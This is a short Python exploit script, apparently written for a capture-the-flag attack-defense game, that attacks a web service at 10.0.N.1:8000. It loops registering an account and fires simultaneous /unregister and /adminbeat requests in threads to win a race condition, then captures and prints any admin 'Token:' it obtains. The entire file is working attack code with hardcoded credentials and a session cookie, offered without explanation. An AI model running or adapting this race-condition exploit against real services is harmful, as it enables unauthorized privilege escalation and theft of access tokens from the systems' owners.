import requests
import random
from threading import Thread

import sys

tokens = []
done = False
n = int(sys.argv[1])
def test():
    url = 'http://10.0.%d.1:8000' % n
    aurl = 'http://0:10000'
    sess = requests.Session()
    sess.cookies.update({"session": "15139745293617652567"})
    register_data = {"username": "f2tii1c", "password": "sou5hvjz4zztb4mc", "level": 1}
    unregister_data = {"username": "f2tii1c", "password": "sou5hvjz4zztb4mc"}
    adminbeat_data = {"username": "f2tii1c", "otp": 0, "password": "sou5hvjz4zztb4mc"}
    while not done:
        r = sess.post(url + '/register', json=register_data)

        def unregister():
            r = sess.post(url + '/unregister', json=unregister_data)
        
        def adminbeat():
            global done, n
            r = sess.post(url + '/adminbeat', json=adminbeat_data)
            if r.text.find("Token:") > -1:
                tokens.append(r.text)
                print(r.text)
                n += 1
                done = True

        if not done :
            list(map(lambda t: t.start(), [Thread(target=unregister), Thread(target=adminbeat)]))
        # print(r.text)
        

if __name__ == '__main__':
    test()
